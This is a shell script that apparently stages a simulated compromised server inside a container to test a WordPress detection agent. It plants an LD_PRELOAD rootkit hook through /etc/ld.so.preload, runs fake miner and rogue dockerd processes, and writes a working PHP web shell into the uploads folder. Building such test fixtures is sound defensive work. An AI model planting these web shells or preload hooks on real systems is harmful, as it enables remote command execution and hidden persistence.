#!/bin/sh
# Runs inside the container. Usage: scenario.sh infected|clean
set -e
if [ "$1" = infected ]; then
  gcc -shared -fPIC -o /usr/lib/rk_hook.so /e2e/rk_hook.c -ldl
  # Miner: hidden from ps by the hook, runs from /tmp.
  cp /bin/sleep /tmp/rk_miner && /tmp/rk_miner 600 &
  # Second Docker daemon, as on the hacked droplet (/bin/wbin/dockerd there).
  mkdir -p /opt/wbin && cp /bin/sleep /opt/wbin/dockerd && cp /bin/sleep /usr/local/bin/dockerd
  /usr/local/bin/dockerd 600 &
  /opt/wbin/dockerd 600 &
  # Binary deleted after launch.
  cp /bin/sleep /var/lib/gone && /var/lib/gone 600 &
  # Binary replaced by an upgrade while running: normal, must not be flagged.
  cp /bin/sleep /usr/local/bin/upgraded && /usr/local/bin/upgraded 600 &
  sleep 0.5 && rm /var/lib/gone
  rm /usr/local/bin/upgraded && cp /bin/sleep /usr/local/bin/upgraded
  echo '<?php system($_GET["c"]);' > /var/www/html/wp-content/uploads/2024/01/thumb.php
  # Last: from here on every glibc program loads the hook.
  echo /usr/lib/rk_hook.so > /etc/ld.so.preload
fi
cd /var/www/html && wp-agent
